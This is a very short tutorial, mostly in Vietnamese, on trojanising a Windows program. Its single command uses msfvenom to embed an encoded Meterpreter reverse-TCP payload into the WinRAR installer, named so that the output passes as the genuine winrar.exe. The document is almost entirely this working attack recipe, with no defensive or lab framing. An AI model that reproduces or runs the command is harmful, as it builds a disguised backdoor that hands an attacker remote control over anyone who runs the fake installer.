# Injecting Payloads Into Windows Portable Executables

Chèn payload vào các tệp thực thi Windows Portable

Gỉa sử chúng ta sẽ tiêm vào `winrar.exe` 

tải file winrar.exe theo bản (x64/x86) mà chúng ta muốn gửi payload

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=port -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/wrar602.exe > path to lưu file (file cuối nên là winrar.exe)`























